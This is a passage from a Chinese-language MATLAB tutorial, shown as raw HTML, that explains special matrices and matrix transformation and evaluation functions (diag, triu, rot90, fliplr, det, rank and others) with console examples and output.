class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">hilb</span>(<span class="hljs-number">4</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>    <span class="hljs-number">1.0000</span>    <span class="hljs-number">0.5000</span>    <span class="hljs-number">0.3333</span>    <span class="hljs-number">0.2500</span><br>    <span class="hljs-number">0.5000</span>    <span class="hljs-number">0.3333</span>    <span class="hljs-number">0.2500</span>    <span class="hljs-number">0.2000</span><br>    <span class="hljs-number">0.3333</span>    <span class="hljs-number">0.2500</span>    <span class="hljs-number">0.2000</span>    <span class="hljs-number">0.1667</span><br>    <span class="hljs-number">0.2500</span>    <span class="hljs-number">0.2000</span>    <span class="hljs-number">0.1667</span>    <span class="hljs-number">0.1429</span><br><br>&gt;&gt; format <span class="hljs-built_in">rat</span> <span class="hljs-comment">% 以有理数格式输出</span><br>&gt;&gt; <span class="hljs-built_in">hilb</span>(<span class="hljs-number">4</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>       <span class="hljs-number">1</span>              <span class="hljs-number">1</span>/<span class="hljs-number">2</span>            <span class="hljs-number">1</span>/<span class="hljs-number">3</span>            <span class="hljs-number">1</span>/<span class="hljs-number">4</span>     <br>       <span class="hljs-number">1</span>/<span class="hljs-number">2</span>            <span class="hljs-number">1</span>/<span class="hljs-number">3</span>            <span class="hljs-number">1</span>/<span class="hljs-number">4</span>            <span class="hljs-number">1</span>/<span class="hljs-number">5</span>     <br>       <span class="hljs-number">1</span>/<span class="hljs-number">3</span>            <span class="hljs-number">1</span>/<span class="hljs-number">4</span>            <span class="hljs-number">1</span>/<span class="hljs-number">5</span>            <span class="hljs-number">1</span>/<span class="hljs-number">6</span>     <br>       <span class="hljs-number">1</span>/<span class="hljs-number">4</span>            <span class="hljs-number">1</span>/<span class="hljs-number">5</span>            <span class="hljs-number">1</span>/<span class="hljs-number">6</span>            <span class="hljs-number">1</span>/<span class="hljs-number">7</span> <br></code></pre></div></td></tr></table></figure><h5 id="3-1-2-4-伴随矩阵"><a href="#3-1-2-4-伴随矩阵" class="headerlink" title="3.1.2.4 伴随矩阵"></a>3.1.2.4 伴随矩阵</h5><p><code>compan(p)函数</code>：，其中 p 是一个多项式的系数向量，高次幂系数排在前，低次幂系数排在后。</p><p>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210617160816413.png"></p><p>示例：生成多项式 x<sup>3</sup> - 2x<sup>2</sup> - 5x+6 的伴随矩阵。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; p=[<span class="hljs-number">1</span>,<span class="hljs-number">-2</span>,<span class="hljs-number">-5</span>,<span class="hljs-number">6</span>];<br>&gt;&gt; a=<span class="hljs-built_in">compan</span>(p)<br><br>a =<br><br>       <span class="hljs-number">2</span>              <span class="hljs-number">5</span>             <span class="hljs-number">-6</span>       <br>       <span class="hljs-number">1</span>              <span class="hljs-number">0</span>              <span class="hljs-number">0</span>       <br>       <span class="hljs-number">0</span>              <span class="hljs-number">1</span>              <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-2-5-帕斯卡矩阵"><a href="#3-1-2-5-帕斯卡矩阵" class="headerlink" title="3.1.2.5 帕斯卡矩阵"></a>3.1.2.5 帕斯卡矩阵</h5><p><code>pascal(n)函数</code>：生成一个 n 阶帕斯卡矩阵。<br>帕斯卡矩阵的第一行元素和第一列元素都为 1 ，其余位置的元素是该元素的左边元素与上面元素相加，即 <code>p(i,j)=p(i,j-1)+p(i-1,j)</code>，且 p(i,1)=1,p(1,j)=1。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">pascal</span>(<span class="hljs-number">5</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>       <span class="hljs-number">1</span>              <span class="hljs-number">1</span>              <span class="hljs-number">1</span>              <span class="hljs-number">1</span>              <span class="hljs-number">1</span>       <br>       <span class="hljs-number">1</span>              <span class="hljs-number">2</span>              <span class="hljs-number">3</span>              <span class="hljs-number">4</span>              <span class="hljs-number">5</span>       <br>       <span class="hljs-number">1</span>              <span class="hljs-number">3</span>              <span class="hljs-number">6</span>             <span class="hljs-number">10</span>             <span class="hljs-number">15</span>       <br>       <span class="hljs-number">1</span>              <span class="hljs-number">4</span>             <span class="hljs-number">10</span>             <span class="hljs-number">20</span>             <span class="hljs-number">35</span>       <br>       <span class="hljs-number">1</span>              <span class="hljs-number">5</span>             <span class="hljs-number">15</span>             <span class="hljs-number">35</span>             <span class="hljs-number">70</span>  <br></code></pre></div></td></tr></table></figure><h3 id="3-2-矩阵变换"><a href="#3-2-矩阵变换" class="headerlink" title="3.2 矩阵变换"></a>3.2 矩阵变换</h3><h4 id="3-2-1-对角阵"><a href="#3-2-1-对角阵" class="headerlink" title="3.2.1 对角阵"></a>3.2.1 对角阵</h4><blockquote><ol><li>对角矩阵：只有对角线上有非零元素的矩阵。</li></ol></blockquote><blockquote><ol start="2"><li>数量矩阵：对角线上的元素相等的对角矩阵。</li></ol></blockquote><blockquote><ol start="3"><li>单位矩阵：对角线上的元素都为 1 的对角矩阵。</li></ol></blockquote><h5 id="3-2-1-1-提取矩阵的对角线元素"><a href="#3-2-1-1-提取矩阵的对角线元素" class="headerlink" title="3.2.1.1 提取矩阵的对角线元素"></a>3.2.1.1 提取矩阵的对角线元素</h5><blockquote><ol><li>diag(a)：提取矩阵 a 主对角线元素，产生一个列向量。</li></ol></blockquote><blockquote><ol start="2"><li>diag(a,k)：提取矩阵 a 第 k 条对角线的元素，产生一个列向量。主对角线为第 0 条对角线，向上走为第 1 条、···、第 n 条对角线；向下走为 第 -1 条、····、第 -n 条对角线。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span>     <span class="hljs-number">9</span><br>     <span class="hljs-number">4</span>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span><br><br>&gt;&gt; <span class="hljs-built_in">diag</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span><br>     <span class="hljs-number">6</span><br>     <span class="hljs-number">6</span><br><br>&gt;&gt; <span class="hljs-built_in">diag</span>(a,<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">2</span><br>     <span class="hljs-number">7</span><br>     <span class="hljs-number">7</span><br><br>&gt;&gt; <span class="hljs-built_in">diag</span>(a,<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span><br>     <span class="hljs-number">6</span><br>     <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><h5 id="3-2-1-2-构造对角矩阵"><a href="#3-2-1-2-构造对角矩阵" class="headerlink" title="3.2.1.2 构造对角矩阵"></a>3.2.1.2 构造对角矩阵</h5><blockquote><ol><li>diag(v)：以向量 v 为主对角线元素，产生对角矩阵。</li></ol></blockquote><blockquote><ol start="2"><li>diag(v,k)：以向量 v 为第 k 条对角线元素，产生对角矩阵。</li></ol></blockquote><p>示例1：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span>     <span class="hljs-number">5</span><br><br>&gt;&gt; <span class="hljs-built_in">diag</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">2</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">3</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">4</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>示例2：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=(<span class="hljs-number">1</span>:<span class="hljs-number">5</span>)<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span>     <span class="hljs-number">5</span><br><br>&gt;&gt; <span class="hljs-built_in">diag</span>(a,<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">2</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">3</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">4</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h4 id="3-2-2-三角阵"><a href="#3-2-2-三角阵" class="headerlink" title="3.2.2 三角阵"></a>3.2.2 三角阵</h4><h5 id="3-2-2-1-上三角阵"><a href="#3-2-2-1-上三角阵" class="headerlink" title="3.2.2.1 上三角阵"></a>3.2.2.1 上三角阵</h5><p>矩阵的对角线以下的元素全为零的矩阵。</p><blockquote><ol><li><code>triu(a)</code>：提取矩阵 a 的主对角线及以上的元素。</li></ol></blockquote><blockquote><ol start="2"><li><code>triu(a,k)</code>：提取矩阵 a 的第 k 条对角线及以上的元素。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=<span class="hljs-built_in">ones</span>(<span class="hljs-number">5</span>)<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br><br>&gt;&gt; <span class="hljs-built_in">triu</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span><br><br>&gt;&gt; <span class="hljs-built_in">triu</span>(a,<span class="hljs-number">-1</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h5 id="3-2-2-2-下三角阵"><a href="#3-2-2-2-下三角阵" class="headerlink" title="3.2.2.2 下三角阵"></a>3.2.2.2 下三角阵</h5><p>对角线以上的元素全为零的矩阵。提取矩阵 a 的下三角矩阵的函数是<code>tril</code>，用法与 <code>triu函数</code>完全相同。</p><h4 id="3-2-3-矩阵的转置"><a href="#3-2-3-矩阵的转置" class="headerlink" title="3.2.3 矩阵的转置"></a>3.2.3 矩阵的转置</h4><ul><li><p>转置运算符是小数点后面接单引号 <code>.&#39;</code>。</p></li><li><p>共轭转置，其运算符的单引号 <code>&#39;</code>，它在转置的基础上还要取每个数的复共轭。如果是实数则一样。</p></li></ul><p>示例：复数</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<span class="hljs-number">3</span>+<span class="hljs-number">4</span><span class="hljs-built_in">i</span>,<span class="hljs-number">1</span><span class="hljs-number">-2</span><span class="hljs-built_in">i</span>]<br><br>a =<br><br>   <span class="hljs-number">1.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">3.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span><br>   <span class="hljs-number">3.0000</span> + <span class="hljs-number">4.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">1.0000</span> - <span class="hljs-number">2.0000</span><span class="hljs-built_in">i</span><br><br>&gt;&gt; a.&#x27;<br><br><span class="hljs-built_in">ans</span> =<br><br>   <span class="hljs-number">1.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">3.0000</span> + <span class="hljs-number">4.0000</span><span class="hljs-built_in">i</span><br>   <span class="hljs-number">3.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">1.0000</span> - <span class="hljs-number">2.0000</span><span class="hljs-built_in">i</span><br><br>&gt;&gt; a&#x27;<br><br><span class="hljs-built_in">ans</span> =<br><br>   <span class="hljs-number">1.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">3.0000</span> - <span class="hljs-number">4.0000</span><span class="hljs-built_in">i</span><br>   <span class="hljs-number">3.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span>   <span class="hljs-number">1.0000</span> + <span class="hljs-number">2.0000</span><span class="hljs-built_in">i</span><br></code></pre></div></td></tr></table></figure><p>示例：实数</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>;<span class="hljs-number">3</span>,<span class="hljs-number">4</span>;<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span><br>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span><br><br>&gt;&gt; a.&#x27;<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">3</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">2</span>     <span class="hljs-number">4</span>     <span class="hljs-number">6</span><br><br>&gt;&gt; a&#x27;<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">3</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">2</span>     <span class="hljs-number">4</span>     <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><h4 id="3-2-4-矩阵的旋转"><a href="#3-2-4-矩阵的旋转" class="headerlink" title="3.2.4 矩阵的旋转"></a>3.2.4 矩阵的旋转</h4><p><code>rot90(a,k)</code>：将矩阵 a 逆时针方向旋转 90°的 k 倍，当 k 为 1 时可省略。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>;<span class="hljs-number">5</span>:<span class="hljs-number">9</span>;<span class="hljs-number">9</span>:<span class="hljs-number">13</span>]<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span>     <span class="hljs-number">9</span><br>     <span class="hljs-number">9</span>    <span class="hljs-number">10</span>    <span class="hljs-number">11</span>    <span class="hljs-number">12</span>    <span class="hljs-number">13</span><br><br>&gt;&gt; <span class="hljs-built_in">rot90</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">5</span>     <span class="hljs-number">9</span>    <span class="hljs-number">13</span><br>     <span class="hljs-number">4</span>     <span class="hljs-number">8</span>    <span class="hljs-number">12</span><br>     <span class="hljs-number">3</span>     <span class="hljs-number">7</span>    <span class="hljs-number">11</span><br>     <span class="hljs-number">2</span>     <span class="hljs-number">6</span>    <span class="hljs-number">10</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">5</span>     <span class="hljs-number">9</span><br><br>&gt;&gt; <span class="hljs-built_in">rot90</span>(a,<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>    <span class="hljs-number">13</span>    <span class="hljs-number">12</span>    <span class="hljs-number">11</span>    <span class="hljs-number">10</span>     <span class="hljs-number">9</span><br>     <span class="hljs-number">9</span>     <span class="hljs-number">8</span>     <span class="hljs-number">7</span>     <span class="hljs-number">6</span>     <span class="hljs-number">5</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">4</span>     <span class="hljs-number">3</span>     <span class="hljs-number">2</span>     <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h4 id="3-2-5-矩阵的翻转"><a href="#3-2-5-矩阵的翻转" class="headerlink" title="3.2.5 矩阵的翻转"></a>3.2.5 矩阵的翻转</h4><blockquote><ol><li><code>fliplr(a)</code>：对矩阵 a 实施左右翻转。</li></ol></blockquote><blockquote><ol start="2"><li><code>flipud(a)</code>：对矩阵 a 实施上下翻转。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>;<span class="hljs-number">5</span>:<span class="hljs-number">8</span>;<span class="hljs-number">9</span>:<span class="hljs-number">12</span>]<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span><br>     <span class="hljs-number">9</span>    <span class="hljs-number">10</span>    <span class="hljs-number">11</span>    <span class="hljs-number">12</span><br><br>&gt;&gt; <span class="hljs-built_in">fliplr</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">4</span>     <span class="hljs-number">3</span>     <span class="hljs-number">2</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">8</span>     <span class="hljs-number">7</span>     <span class="hljs-number">6</span>     <span class="hljs-number">5</span><br>    <span class="hljs-number">12</span>    <span class="hljs-number">11</span>    <span class="hljs-number">10</span>     <span class="hljs-number">9</span><br><br>&gt;&gt; <span class="hljs-built_in">flipud</span>(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">9</span>    <span class="hljs-number">10</span>    <span class="hljs-number">11</span>    <span class="hljs-number">12</span><br>     <span class="hljs-number">5</span>     <span class="hljs-number">6</span>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span><br>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>     <span class="hljs-number">3</span>     <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><h4 id="3-2-6-矩阵求逆"><a href="#3-2-6-矩阵求逆" class="headerlink" title="3.2.6 矩阵求逆"></a>3.2.6 矩阵求逆</h4><p><code>inv(a)</code>：求方阵 a 的逆矩阵。</p><h3 id="3-3-矩阵求值"><a href="#3-3-矩阵求值" class="headerlink" title="3.3 矩阵求值"></a>3.3 矩阵求值</h3><h4 id="3-3-1-矩阵的行列式值"><a href="#3-3-1-矩阵的行列式值" class="headerlink" title="3.3.1 矩阵的行列式值"></a>3.3.1 矩阵的行列式值</h4><p><code>det(a)</code>：求方阵 a 所对应的行列式的值。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>;<span class="hljs-number">4</span>:<span class="hljs-number">6</span>;<span class="hljs-number">7</span>:<span class="hljs-number">9</span>]<br><br>a =<br><br>       <span class="hljs-number">1</span>              <span class="hljs-number">2</span>              <span class="hljs-number">3</span>       <br>       <span class="hljs-number">4</span>              <span class="hljs-number">5</span>              <span class="hljs-number">6</span>       <br>       <span class="hljs-number">7</span>              <span class="hljs-number">8</span>              <span class="hljs-number">9</span>       <br><br>&gt;&gt; format <span class="hljs-built_in">rat</span><br>&gt;&gt; det(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>      <span class="hljs-number">-1</span>/<span class="hljs-number">1050839913053116</span><br></code></pre></div></td></tr></table></figure><h4 id="3-3-2-矩阵的秩"><a href="#3-3-2-矩阵的秩" class="headerlink" title="3.3.2 矩阵的秩"></a>3.3.2 矩阵的秩</h4><p>矩阵线性无关的行数或列数称为矩阵的秩。<br><code>rank(a)</code>：求矩阵 a 的秩。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>;<span class="hljs-number">5</span>:<span class="hljs-number">8</span>;<span class="hljs-number">9</span>:<span 